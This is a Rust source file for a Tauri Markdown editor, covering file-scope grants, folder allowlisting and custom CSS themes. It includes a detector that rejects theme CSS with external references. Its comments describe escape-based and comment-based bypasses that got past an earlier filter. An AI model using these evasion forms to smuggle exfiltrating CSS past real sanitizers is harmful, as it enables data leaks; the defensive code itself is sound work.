use std::collections::HashSet;
use std::path::PathBuf;
use std::sync::Mutex;
use tauri::{Emitter, Manager};
use tauri_plugin_dialog::DialogExt;
use tauri_plugin_fs::FsExt;

struct OpenedUrls(Mutex<Option<Vec<tauri::Url>>>);

// 已核准為「冊」的根資料夾（canonical paths）。只有經 pick_codex_root 的原生 dialog
// 選取的資料夾才會進此集合——前端無法注入任意路徑（防 XSS 任意路徑枚舉，決策 50）。
// 跨重啟持久化於 app_local_data_dir 私有檔（不經 store plugin / fs scope，XSS 不可寫）。
struct ApprovedRoots(Mutex<HashSet<PathBuf>>);

#[tauri::command]
fn grant_scope(app: tauri::AppHandle, path: String) -> Result<String, String> {
    let p = PathBuf::from(&path);
    let canonical = p.canonicalize().map_err(|e| e.to_string())?;
    let target = if canonical.is_file() {
        if !is_markdown(&canonical) {
            return Err("Only .md and .markdown files are allowed".into());
        }
        canonical
    } else if canonical.is_dir() {
        find_readme(&canonical).ok_or("No README.md found in this folder")?
    } else {
        return Err("Path is not a file or folder".into());
    };
    app.fs_scope()
        .allow_file(&target)
        .map_err(|e| e.to_string())?;
    Ok(target.to_string_lossy().into_owned())
}

fn find_readme(dir: &std::path::Path) -> Option<PathBuf> {
    let entries = std::fs::read_dir(dir).ok()?;
    entries.filter_map(|e| e.ok()).find_map(|entry| {
        let name = entry.file_name();
        let lower = name.to_string_lossy().to_lowercase();
        if matches!(lower.as_str(), "readme.md" | "readme.markdown") {
            entry.path().canonicalize().ok().filter(|p| p.is_file())
        } else {
            None
        }
    })
}

#[tauri::command]
fn get_opened_urls(state: tauri::State<'_, OpenedUrls>) -> Vec<String> {
    state
        .0
        .lock()
        .unwrap()
        .take()
        .unwrap_or_default()
        .into_iter()
        .filter_map(|url| url.to_file_path().ok())
        .map(|p| p.to_string_lossy().into_owned())
        .collect()
}

fn is_markdown(path: &std::path::Path) -> bool {
    path.extension()
        .and_then(|e| e.to_str())
        .is_some_and(|e| matches!(e.to_lowercase().as_str(), "md" | "markdown"))
}

const MAX_DEPTH: usize = 16;
const MAX_FILES: usize = 5000; // 上限：防誤選巨大資料夾拖慢遍歷 / 無界 Vec

// Read-only recursive listing of .md files under a folder (the "Codex" feature).
// Pure std::fs — does NOT touch fs_scope / allow_file: listing grants no scope.
// Opening a file still goes through per-file grant_scope (load-bearing wall intact).
#[tauri::command]
fn list_codex_files(
    state: tauri::State<'_, ApprovedRoots>,
    root: String,
) -> Result<Vec<String>, String> {
    let base = PathBuf::from(&root)
        .canonicalize()
        .map_err(|e| e.to_string())?;
    if !base.is_dir() {
        return Err("Path is not a folder".into());
    }
    // 授權閘：root 必須是經 pick_codex_root 核准過的冊，否則拒絕（防 XSS 任意路徑枚舉，決策 50）。
    if !state.0.lock().unwrap().contains(&base) {
        return Err("Folder is not an approved codex".into());
    }
    let mut out = Vec::new();
    walk(&base, 0, &mut out);
    Ok(out)
}

fn walk(dir: &std::path::Path, depth: usize, out: &mut Vec<String>) {
    if depth > MAX_DEPTH || out.len() >= MAX_FILES {
        return;
    }
    let Ok(entries) = std::fs::read_dir(dir) else {
        return; // unreadable dir: skip silently (mirrors find_readme .ok()?)
    };
    for entry in entries.filter_map(|e| e.ok()) {
        if out.len() >= MAX_FILES {
            return; // 達檔案數上限即停（含遞迴中途），避免無界遍歷
        }
        let path = entry.path();
        let Ok(meta) = path.symlink_metadata() else {
            continue;
        };
        if meta.file_type().is_symlink() {
            continue; // skip symlinks: avoid out-of-tree shortcuts + loops
        }
        if meta.is_dir() {
            walk(&path, depth + 1, out);
        } else if meta.is_file() && is_markdown(&path) {
            out.push(path.to_string_lossy().into_owned());
        }
    }
}

const APPROVED_ROOTS_FILE: &str = "codex_roots.json";

// 私有白名單檔路徑：app_local_data_dir/codex_roots.json（不在任何 fs scope 內，XSS 不可碰）。
fn approved_roots_path(app: &tauri::AppHandle) -> Option<PathBuf> {
    app.path()
        .app_local_data_dir()
        .ok()
        .map(|dir| dir.join(APPROVED_ROOTS_FILE))
}

// 啟動載入白名單：檔不存在 / 不可讀 / JSON 損毀一律回空集合（fail-safe）。
fn load_approved_roots(app: &tauri::AppHandle) -> HashSet<PathBuf> {
    let Some(path) = approved_roots_path(app) else {
        return HashSet::new();
    };
    let Ok(bytes) = std::fs::read(&path) else {
        return HashSet::new();
    };
    serde_json::from_slice::<Vec<String>>(&bytes)
        .map(|list| list.into_iter().map(PathBuf::from).collect())
        .unwrap_or_default()
}

// best-effort 持久化：寫前 create_dir_all（首次目錄不存在）；寫失敗不阻斷（下次 pick 再寫）。
fn persist_approved_roots(app: &tauri::AppHandle, roots: &HashSet<PathBuf>) {
    let Some(path) = approved_roots_path(app) else {
        return;
    };
    if let Some(parent) = path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let list: Vec<String> = roots
        .iter()
        .map(|p| p.to_string_lossy().into_owned())
        .collect();
    if let Ok(json) = serde_json::to_vec(&list) {
        let _ = std::fs::write(&path, json);
    }
}

#[derive(serde::Serialize)]
struct CodexPick {
    root: String,
    files: Vec<String>,
}

// 開「冊」：原生 dialog 選資料夾 → 核准（加入 approved set + 持久化）→ 唯讀列舉 .md。
// dialog 由 Rust 持有：root 來自使用者真實選取、前端無法注入任意路徑（決策 50）。
// 必為 async fn：blocking_pick_folder 不可在 main thread。
#[tauri::command]
async fn pick_codex_root(app: tauri::AppHandle) -> Result<Option<CodexPick>, String> {
    let Some(picked) = app.dialog().file().blocking_pick_folder() else {
        return Ok(None); // 使用者取消
    };
    let canonical = picked
        .into_path()
        .map_err(|e| e.to_string())?
        .canonicalize()
        .map_err(|e| e.to_string())?;
    if !canonical.is_dir() {
        return Err("Selected path is not a folder".into());
    }
    {
        let state = app.state::<ApprovedRoots>();
        let mut set = state.0.lock().unwrap();
        set.insert(canonical.clone());
        persist_approved_roots(&app, &set);
    }
    let mut files = Vec::new();
    walk(&canonical, 0, &mut files);
    Ok(Some(CodexPick {
        root: canonical.to_string_lossy().into_owned(),
        files,
    }))
}

#[tauri::command]
fn load_locales(app: tauri::AppHandle) -> Result<serde_json::Value, String> {
    let app_dir = app.path().app_local_data_dir().map_err(|e| e.to_string())?;
    let locales_dir = app_dir.join("locales");
    if !locales_dir.exists() {
        std::fs::create_dir_all(&locales_dir).map_err(|e| e.to_string())?;
    }

    // 翻譯真相唯一來源是 repo 的 locales/*.json（前端 i18n.ts 亦 import 同一組檔案，
    // 編譯期內嵌保證兩端同步）。此處只在使用者語言包不存在時種下初始檔。
    const SEEDS: [(&str, &str); 4] = [
        ("zh_Hant.json", include_str!("../../locales/zh_Hant.json")),
        ("en.json", include_str!("../../locales/en.json")),
        ("zh_Hans.json", include_str!("../../locales/zh_Hans.json")),
        ("ja.json", include_str!("../../locales/ja.json")),
    ];

    for (filename, content) in SEEDS {
        let path = locales_dir.join(filename);
        if !path.exists() {
            let _ = std::fs::write(&path, content);
        }
    }

    // Read all JSON files in the locales directory
    let mut locales = serde_json::Map::new();
    if let Ok(entries) = std::fs::read_dir(&locales_dir) {
        for entry in entries.filter_map(|e| e.ok()) {
            let path = entry.path();
            if path.is_file() && path.extension().and_then(|ext| ext.to_str()) == Some("json") {
                if let Some(filename) = path.file_stem().and_then(|s| s.to_str()) {
                    if let Ok(content_str) = std::fs::read_to_string(&path) {
                        if let Ok(json_val) = serde_json::from_str::<serde_json::Value>(&content_str) {
                            locales.insert(filename.to_string(), json_val);
                        }
                    }
                }
            }
        }
    }

    Ok(serde_json::Value::Object(locales))
}

#[tauri::command]
async fn delete_codex_folder(app: tauri::AppHandle, path: String) -> Result<(), String> {
    let p = PathBuf::from(&path);
    let canonical = p.canonicalize().map_err(|e| e.to_string())?;
    
    // Remove from ApprovedRoots
    {
        let state = app.state::<ApprovedRoots>();
        let mut set = state.0.lock().unwrap();
        set.remove(&canonical);
        persist_approved_roots(&app, &set);
    }
    
    Ok(())
}

#[tauri::command]
fn open_locales_dir(app: tauri::AppHandle) -> Result<(), String> {
    let app_dir = app.path().app_local_data_dir().map_err(|e| e.to_string())?;
    let locales_dir = app_dir.join("locales");
    if !locales_dir.exists() {
        std::fs::create_dir_all(&locales_dir).map_err(|e| e.to_string())?;
    }
    // free function 收 AsRef<Path>，保留原始 path bytes；OpenerExt::open_path
    // 的簽名是 Into<String>，非 UTF-8 路徑會被 lossy 轉換成開不到的路徑。
    tauri_plugin_opener::open_path(&locales_dir, None::<&str>).map_err(|e| e.to_string())
}

#[derive(serde::Serialize, serde::Deserialize, Clone, Debug)]
#[serde(rename_all = "camelCase")]
pub struct CustomTheme {
    pub id: String,
    pub name: String,
    pub css_content: String,
    pub file_path: String,
}

// 自訂主題 CSS 的外連防線：偵測到任何外部資源參照就整份拒絕（回傳空字串），
// 乾淨的主題則原文原樣輸出。
//
// 為何是「偵測 + 拒絕」而非「就地清除」：清除要求本函式對 CSS 的理解與瀏覽器
// tokenizer 完全一致，任何落差都是繞過。前一版就地改寫的實作被四種形式穿透
// （註解前綴 @import、\75 rl()、\5c 75 二階 escape、單斜線 https:/host），
// 且改寫本身會破壞合法 CSS（content: "\22" 被解成裸引號後打亂字串邊界）。
// 改為偵測後，判斷失準只會偏向「誤判為可疑 → 拒絕載入」，方向是安全的。
//
// 這是 best-effort 的深度防禦，不是安全邊界：CSP 的 img-src 含萬用 `https:`
// （Markdown 外部圖片所需），故此函式是自訂主題外連的唯一防線。
fn sanitize_theme_css(css: &str) -> String {
    if has_external_reference(css) {
        String::new()
    } else {
        css.to_string()
    }
}

// 已知會觸發外部請求的 scheme。判定在解碼後的分析視圖上做，故 escape 偽裝無效。
const EXTERNAL_SCHEMES: [&str; 6] = ["http:", "https:", "ftp:", "ws:", "wss:", "file:"];

fn has_external_reference(css: &str) -> bool {
    let decoded = decode_css_escapes_to_fixpoint(&strip_css_comments(css)).to_ascii_lowercase();
    let view = elide_data_uris(&decoded);

    if view.contains("@import") {
        return true;
    }
    // 涵蓋 protocol-relative（//host/path）
    if view.contains("//") {
        return true;
    }
    if EXTERNAL_SCHEMES.iter().any(|s| view.contains(s)) {
        return true;
    }
    // url() 內容帶任何 scheme 即拒絕（涵蓋清單外的協定）。相對／同源絕對路徑
    // 受 CSP default-src 'self' 侷限，不構成外連，予以放行。
    let mut rest = view.as_str();
    while let Some(pos) = rest.find("url(") {
        let after = &rest[pos + 4..];
        let Some(end) = after.find(')') else {
            return true; // 未閉合的 url( — 無法判定，保守拒絕
        };
        let inner = after[..end].trim().trim_matches(|c: char| c == '"' || c == '\'');
        if inner.contains(':') {
            return true;
        }
        rest = &after[end..];
    }
    false
}

// data: URI 不會外連，但其內容常含 SVG 命名空間 http://www.w3.org/2000/svg 等字面，
// 會誤觸上方的 scheme 偵測（內建 Office 97 主題就是這樣被誤殺的）。偵測前先剔除。
//
// data:image/svg+xml 內嵌的 <image href> / <use href> 已實測確認被瀏覽器阻擋
// （SVG 作為 background-image 處於 secure static mode），故不需再對 MIME 分類。
//
// 邊界抓錯只會讓更多內容留在視圖裡 → 更容易判為可疑 → 偏保守，不是安全缺口。
fn elide_data_uris(css: &str) -> String {
    let mut out = String::with_capacity(css.len());
    let mut chars = css.char_indices().peekable();

    while let Some(&(i, c)) = chars.peek() {
        // url(...)：以括號配對取內容，是 data: 就整段剔除
        if css.get(i..i + 4).is_some_and(|s| s.eq_ignore_ascii_case("url(")) {
            for _ in 0..4 {
                chars.next();
            }
            let mut inner = String::new();
            let mut depth = 1;
            for (_, ch) in chars.by_ref() {
                if ch == ')' {
                    depth -= 1;
                    if depth == 0 {
                        break;
                    }
                }
                if ch == '(' {
                    depth += 1;
                }
                inner.push(ch);
            }
            let probe = inner.trim().trim_matches(|c: char| c == '"' || c == '\'');
            out.push_str("url(");
            if !probe.starts_with("data:") {
                out.push_str(&inner);
            }
            out.push(')');
            continue;
        }
        // 引號字串：以配對的同類引號為界（data: 內部的異類引號不會誤斷）
        if c == '"' || c == '\'' {
            let quote = c;
            chars.next();
            let mut inner = String::new();
            for (_, ch) in chars.by_ref() {
                if ch == quote {
                    break;
                }
                inner.push(ch);
            }
            out.push(quote);
            if !inner.trim_start().starts_with("data:") {
                out.push_str(&inner);
            }
            out.push(quote);
            continue;
        }
        chars.next();
        out.push(c);
    }
    out
}

// 移除 /* */ 註解。字串內的 /* 不算註解，故需追蹤引號狀態。
// 註解替換為空白而非直接刪除，避免 `a/**/b` 黏合成新 token。
fn strip_css_comments(css: &str) -> String {
    let mut out = String::with_capacity(css.len());
    let mut chars = css.chars().peekable();
    let mut in_string: Option<char> = None;

    while let Some(c) = chars.next() {
        match in_string {
            Some(quote) => {
                out.push(c);
                if c == '\\' {
                    if let Some(escaped) = chars.next() {
                        out.push(escaped);
                    }
                } else if c == quote {
                    in_string = None;
                }
            }
            None => {
                if c == '/' && chars.peek() == Some(&'*') {
                    chars.next();
                    let mut prev = '\0';
                    for cur in chars.by_ref() {
                        if prev == '*' && cur == '/' {
                            break;
                        }
                        prev = cur;
                    }
                    out.push(' ');
                } else {
                    if c == '"' || c == '\'' {
                        in_string = Some(c);
                    }
                    out.push(c);
                }
            }
        }
    }
    out
}

// 反覆解碼直到不再變化：單次解碼擋不住二階 escape（`\5c 75 rl(` 解一次得
// `\75 rl(`，瀏覽器自己會再解一次還原成 `url(`）。迭代上限防病態輸入。
fn decode_css_escapes_to_fixpoint(css: &str) -> String {
    let mut current = css.to_string();
    for _ in 0..8 {
        let next = decode_css_escapes_once(&current);
        if next == current {
            break;
        }
        current = next;
    }
    current
}

// `\` + 1-6 hex（可跟一個終止空白）→ 該 code point；`\` + 其他字元 → 該字元。
// 只用於產生分析視圖，不影響輸出，故不必顧慮字串邊界是否被破壞。
fn decode_css_escapes_once(css: &str) -> String {
    let mut out = String::with_capacity(css.len());
    let mut chars = css.chars().peekable();

    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        let mut hex = String::new();
        while hex.len() < 6 {
            match chars.peek() {
                Some(h) if h.is_ascii_hexdigit() => {
                    hex.push(*h);
                    chars.next();
                }
                _ => break,
            }
        }
        if hex.is_empty() {
            if let Some(literal) = chars.next() {
                out.push(literal);
            }
        } else {
            // CSS 規範：hex escape 後的單一空白是終止符，不是內容
            if chars.peek().is_some_and(|c| c.is_whitespace()) {
                chars.next();
            }
            if let Some(decoded) = u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
                out.push(decoded);
            }
        }
    }
    out
}

fn parse_theme_name(content: &str, default_id: &str) -> String {
    for line in content.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with("/*") {
            if let Some(pos) = trimmed.find("Theme Name:") {
                let rest = &trimmed[pos + "Theme Name:".len()..];
                let cleaned = rest.trim_matches(|c: char| c == '*' || c == '/' || c.is_whitespace());
                if !cleaned.is_empty() {
                    return cleaned.to_string();
                }
            }
        }
    }
    default_id.to_string()
}

const TEMPLATE_EMERALD_FOREST: &str = r#"/* Theme Name: 翠綠森林 (Emerald Forest) */
html[data-theme="emerald-forest"] {
  --bg: #0d1b1e;
  --bg-bar: #122428;
  --bg-panel: #152828;
  --bg-inset: #091315;
  --fg: #e0ece4;
  --fg-strong: #f0f7f4;
  --fg-muted: #799a8b;
  --accent: #4ecca3;
  --accent-2: #36d399;
  --line: #1f3a34;
  --font-ui: "JetBrains Mono", ui-monospace, monospace;
  --font-edit: "JetBrains Mono", ui-monospace, "Noto Sans TC", monospace;
  --font-preview: "Literata", "Noto Serif TC", serif;
}

html[data-theme="emerald-forest"] body {
  background:
    radial-gradient(1.5px 1.5px at 70% 8%, rgba(78, 204, 163, 0.35), transparent 60%),
    radial-gradient(1px 1px at 30% 92%, rgba(78, 204, 163, 0.25), transparent 60%),
    var(--bg);
}
"#;

const TEMPLATE_NORDIC_FROST: &str = r#"/* Theme Name: 極光北歐 (Nordic Frost) */
html[data-theme="nordic-frost"] {
  --bg: #edf2f7;
  --bg-bar: #e2e8f0;
  --bg-panel: #e2e8f0;
  --bg-inset: rgba(203, 213, 225, 0.5);
  --fg: #1e293b;
  --fg-strong: #0f172a;
  --fg-muted: #64748b;
  --accent: #0284c7;
  --accent-2: #14b8a6;
  --line: #cbd5e1;
  --font-ui: "Space Mono", "Noto Sans TC", monospace;
  --font-edit: "Martian Mono", "Noto Sans TC", monospace;
  --font-preview: "Noto Sans TC", "PingFang TC", sans-serif;
}

html[data-theme="nordic-frost"] #toolbar {
  background: var(--bg-bar);
  border-bottom: 1px solid var(--line);
  box-shadow: 0 4px 12px rgba(15, 23, 42, 0.05);
}
"#;

const TEMPLATE_OFFICE_97: &str = r#"/* Theme Name: Office 97 (經典辦公室) */
html[data-theme="office-97"] {
  --bg: #d4d0c8;
  --bg-bar: #d4d0c8;
  --bg-panel: #d4d0c8;
  --bg-inset: #ffffff;
  --fg: #000000;
  --fg-strong: #000080;
  --fg-muted: #404040;
  --accent: #000080;
  --accent-2: #1084d0;
  --line: #808080;
  --font-ui: "Tahoma", "MS Sans Serif", "Arial", "Noto Sans TC", sans-serif;
  --font-edit: "Courier New", ui-monospace, monospace;
  --font-preview: "Times New Roman", "Noto Serif TC", serif;
}

html[data-theme="office-97"] #toolbar {
  background: #d4d0c8;
  border-bottom: 2px solid #808080;
  box-shadow: inset 1px 1px 0 #ffffff, inset -1px -1px 0 #404040;
}

html[data-theme="office-97"] #toolbar button {
  background: #d4d0c8;
  border-top: 1px solid #ffffff;
  border-left: 1px solid #ffffff;
  border-right: 1px solid #404040;
  border-bottom: 1px solid #404040;
  border-radius: 0;
  color: #000000;
  box-shadow: inset -1px -1px 0 #808080;
}

html[data-theme="office-97"] #toolbar button:hover {
  background: #e4e0d8;
  border-top: 1px solid #ffffff;
  border-left: 1px solid #ffffff;
  border-right: 1px solid #000000;
  border-bottom: 1px solid #000000;
}

html[data-theme="office-97"] #toolbar button:active {
  border-top: 1px solid #404040;
  border-left: 1px solid #404040;
  border-right: 1px solid #ffffff;
  border-bottom: 1px solid #ffffff;
  box-shadow: inset 1px 1px 0 #808080;
}

/* Toolbar Retro Icons for Office 97 */
html[data-theme="office-97"] #toolbar button svg {
  display: none !important;
}

html[data-theme="office-97"] #toolbar button::before {
  content: "";
  width: 16px;
  height: 16px;
  display: block;
  background-repeat: no-repeat;
  background-position: center;
  background-size: contain;
}

html[data-theme="office-97"] #btn-new::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpath fill='%23ffffff' stroke='%23000000' stroke-width='1' d='M3 1h7l4 4v10H3z'/%3E%3Cpath fill='%23c0c0c0' stroke='%23000000' stroke-width='1' d='M10 1v4h4'/%3E%3Cline x1='5' y1='7' x2='11' y2='7' stroke='%23808080'/%3E%3Cline x1='5' y1='9' x2='11' y2='9' stroke='%23808080'/%3E%3Cline x1='5' y1='11' x2='9' y2='11' stroke='%23808080'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] #btn-open::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpath fill='%23ffca28' stroke='%23b26a00' d='M1 3h5l2 2h7v9H1z'/%3E%3Cpath fill='%23ffe082' stroke='%23b26a00' d='M1 6h14l-2 7H3z'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] #btn-codex::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Crect x='2' y='2' width='12' height='12' fill='%23000080' stroke='%23000000' rx='1'/%3E%3Crect x='4' y='2' width='2' height='12' fill='%23ffffff'/%3E%3Crect x='7' y='5' width='5' height='2' fill='%23ffca28'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] #btn-save::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Crect x='2' y='1' width='12' height='14' fill='%23000080' stroke='%23000000' rx='1'/%3E%3Crect x='4' y='1' width='7' height='5' fill='%23c0c0c0' stroke='%23808080'/%3E%3Crect x='5' y='2' width='2' height='3' fill='%23000080'/%3E%3Crect x='4' y='8' width='8' height='6' fill='%23ffffff' stroke='%23808080'/%3E%3Cline x1='6' y1='10' x2='10' y2='10' stroke='%23000080'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] #btn-export::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpath fill='%23ffffff' stroke='%23000000' d='M2 1h8v12H2z'/%3E%3Cpath fill='%23008000' d='M8 4v3H4v2h4v3l5-4z'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] #btn-fullscreen::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Crect x='2' y='2' width='12' height='12' fill='none' stroke='%23000000' stroke-width='2'/%3E%3Crect x='2' y='2' width='12' height='3' fill='%23000080'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] button[data-mode-target="write"]::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpath fill='%23ffca28' stroke='%23000000' d='M12 1l3 3-9 9-4 1 1-4z'/%3E%3Cpath fill='%23ff8f00' d='M10 3l3 3-7 7-3-3z'/%3E%3Cpath fill='%23000000' d='M2 14l-1 1 2-1z'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] button[data-mode-target="split"]::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Crect x='1' y='2' width='6' height='12' fill='%23ffffff' stroke='%23000000'/%3E%3Crect x='9' y='2' width='6' height='12' fill='%23ffffff' stroke='%23000000'/%3E%3Cline x1='3' y1='5' x2='5' y2='5' stroke='%23000080'/%3E%3Cline x1='11' y1='5' x2='13' y2='5' stroke='%23000080'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] button[data-mode-target="read"]::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpath fill='%23ffffff' stroke='%23000000' d='M1 3c3-1 6 0 7 2 1-2 4-3 7-2v9c-3-1-6 0-7 2-1-2-4-3-7-2z'/%3E%3Cline x1='8' y1='5' x2='8' y2='14' stroke='%23000080'/%3E%3C/svg%3E");
}

html[data-theme="office-97"] #btn-settings::before {
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpath fill='%23808080' stroke='%23000000' d='M12 1a3 3 0 0 0-3 4L2 12l2 2 7-7a3 3 0 0 0 1-6z'/%3E%3Ccircle cx='13' cy='3' r='1' fill='%23ffffff'/%3E%3C/svg%3E");
}
"#;

#[tauri::command]
fn load_custom_themes(app: tauri::AppHandle) -> Result<Vec<CustomTheme>, String> {
    let app_dir = app.path().app_local_data_dir().map_err(|e| e.to_string())?;
    let themes_dir = app_dir.join("themes");
    if !themes_dir.exists() {
        std::fs::create_dir_all(&themes_dir).map_err(|e| e.to_string())?;
    }

    let emerald_path = themes_dir.join("emerald-forest.css");
    if !emerald_path.exists() {
        let _ = std::fs::write(&emerald_path, TEMPLATE_EMERALD_FOREST);
    }
    let nordic_path = themes_dir.join("nordic-frost.css");
    if !nordic_path.exists() {
        let _ = std::fs::write(&nordic_path, TEMPLATE_NORDIC_FROST);
    }
    let office_path = themes_dir.join("office-97.css");
    if !office_path.exists() {
        let _ = std::fs::write(&office_path, TEMPLATE_OFFICE_97);
    }

    let mut themes = Vec::new();
    if let Ok(entries) = std::fs::read_dir(&themes_dir) {
        for entry in entries.filter_map(|e| e.ok()) {
            let path = entry.path();
            if path.is_file() && path.extension().and_then(|ext| ext.to_str()) == Some("css") {
                if let Some(id) = path.file_stem().and_then(|s| s.to_str()) {
                    if let Ok(raw_css) = std::fs::read_to_string(&path) {
                        let name = parse_theme_name(&raw_css, id);
                        themes.push(CustomTheme {
                            id: id.to_string(),
                            name,
                            css_content: sanitize_theme_css(&raw_css),
                            file_path: path.to_string_lossy().into_owned(),
                        });
                    }
                }
            }
        }
    }
    themes.sort_by(|a, b| a.id.cmp(&b.id));
    Ok(themes)
}

#[tauri::command]
fn open_themes_dir(app: tauri::AppHandle) -> Result<(), String> {
    let app_dir = app.path().app_local_data_dir().map_err(|e| e.to_string())?;
    let themes_dir = app_dir.join("themes");
    if !themes_dir.exists() {
        std::fs::create_dir_all(&themes_dir).map_err(|e| e.to_string())?;
    }
    tauri_plugin_opener::open_path(&themes_dir, None::<&str>).map_err(|e| e.to_string())
}

#[tauri::command]
async fn import_theme_file(app: tauri::AppHandle) -> Result<Option<Vec<CustomTheme>>, String> {
    let Some(picked) = app
        .dialog()
        .file()
        .add_filter("CSS Theme", &["css"])
        .blocking_pick_file()
    else {
        return Ok(None);
    };

    let source_path = picked.into_path().map_err(|e| e.to_string())?;
    let app_dir = app.path().app_local_data_dir().map_err(|e| e.to_string())?;
    let themes_dir = app_dir.join("themes");
    if !themes_dir.exists() {
        std::fs::create_dir_all(&themes_dir).map_err(|e| e.to_string())?;
    }

    let file_name = source_path
        .file_name()
        .ok_or_else(|| "Invalid file name".to_string())?;
    let dest_path = themes_dir.join(file_name);

    if dest_path.exists() {
        return Err(format!("Theme file '{}' already exists in themes directory", file_name.to_string_lossy()));
    }

    std::fs::copy(&source_path, &dest_path).map_err(|e| e.to_string())?;

    let themes = load_custom_themes(app)?;
    Ok(Some(themes))
}

#[tauri::command]
fn copy_builtin_theme_template(app: tauri::AppHandle, theme_id: String) -> Result<Vec<CustomTheme>, String> {
    let app_dir = app.path().app_local_data_dir().map_err(|e| e.to_string())?;
    let themes_dir = app_dir.join("themes");
    if !themes_dir.exists() {
        std::fs::create_dir_all(&themes_dir).map_err(|e| e.to_string())?;
    }

    let (filename, content) = match theme_id.as_str() {
        "vol-de-nuit" => ("vol-de-nuit-custom.css", r#"/* Theme Name: 暗夜飛行 (自訂版) */
html[data-theme="vol-de-nuit-custom"] {
  --bg: #14161f;
  --bg-panel: #1b1e2b;
  --bg-inset: #10131d;
  --fg: #e6e9f0;
  --fg-strong: #e6e9f0;
  --fg-muted: #8a93ad;
  --accent: #e8b84b;
  --accent-2: #7fd1c9;
  --line: #2a2f42;
  --font-ui: "JetBrains Mono", ui-monospace, monospace;
  --font-edit: "JetBrains Mono", ui-monospace, "Noto Sans TC", monospace;
  --font-preview: "Literata", "Noto Serif TC", serif;
}
"#),
        "inkstone" => ("inkstone-custom.css", r#"/* Theme Name: 硯台 (自訂版) */
html[data-theme="inkstone-custom"] {
  --bg: #f5f2eb;
  --bg-bar: #f1ede3;
  --bg-panel: #f5f2eb;
  --bg-inset: rgba(214, 209, 196, 0.32);
  --fg: #1f1d1a;
  --fg-strong: #3d3a33;
  --fg-muted: #6b675e;
  --accent: #3d3a33;
  --accent-2: #6b675e;
  --line: #d6d1c4;
  --cinnabar: #b3402a;
  --font-ui: "Space Mono", "Noto Sans TC", monospace;
  --font-edit: "Martian Mono", "Noto Sans TC", monospace;
  --font-preview: "Noto Sans TC", "PingFang TC", sans-serif;
}
"#),
        _ => return Err("Unknown built-in theme template".to_string()),
    };

    let target_file = themes_dir.join(filename);
    let _ = std::fs::write(target_file, content);

    load_custom_themes(app)
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    let app = tauri::Builder::default()
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_fs::init())
        .plugin(tauri_plugin_store::Builder::new().build())
        .plugin(tauri_plugin_persisted_scope::init())
        .plugin(tauri_plugin_opener::init())
        .manage(OpenedUrls(Mutex::new(None)))
        .manage(ApprovedRoots(Mutex::new(HashSet::new())))
        .invoke_handler(tauri::generate_handler![
            grant_scope,
            get_opened_urls,
            list_codex_files,
            pick_codex_root,
            load_locales,
            open_locales_dir,
            delete_codex_folder,
            load_custom_themes,
            open_themes_dir,
            import_theme_file,
            copy_builtin_theme_template
        ])
        .build(tauri::generate_context!())
        .expect("error while building tauri application");

    // 啟動載入持久化的冊白名單（決策 50；fail-safe 回空集合，不阻斷啟動）。
    {
        let loaded = load_approved_roots(app.handle());
        *app.state::<ApprovedRoots>().0.lock().unwrap() = loaded;
    }

    // Windows: file path comes as CLI argument (RunEvent::Opened is macOS-only)
    #[cfg(target_os = "windows")]
    {
        if let Some(path_str) = std::env::args().nth(1) {
            let path = PathBuf::from(&path_str);
            if is_markdown(&path) {
                if let Ok(url) = tauri::Url::from_file_path(&path) {
                    app.state::<OpenedUrls>().0.lock().unwrap().replace(vec![url]);
                }
            }
        }
    }

    app.run(|app_handle, event| {
        #[cfg(any(target_os = "macos", target_os = "ios", target_os = "android"))]
        if let tauri::RunEvent::Opened { urls } = event {
            let md_urls: Vec<tauri::Url> = urls
                .into_iter()
                .filter(|url| {
                    url.to_file_path()
                        .ok()
                        .map(|p| is_markdown(&p))
                        .unwrap_or(false)
                })
                .collect();
            if md_urls.is_empty() {
                return;
            }
            let paths: Vec<String> = md_urls
                .iter()
                .filter_map(|url| url.to_file_path().ok())
                .map(|p| p.to_string_lossy().into_owned())
                .collect();
            app_handle
                .state::<OpenedUrls>()
                .0
                .lock()
                .unwrap()
                .replace(md_urls);
            let _ = app_handle.emit("file-open", &paths);
        }
    });
}

#[cfg(test)]
mod tests {
    use super::*;

    // 每一條都是實測確認過會發出真實外連請求的形式（2026-07-26 取證，
    // 瀏覽器引擎 + 本地 server 收證）。CSP 的 img-src 含萬用 `https:`，擋不住這些。
    #[test]
    fn rejects_proven_exfiltration_payloads() {
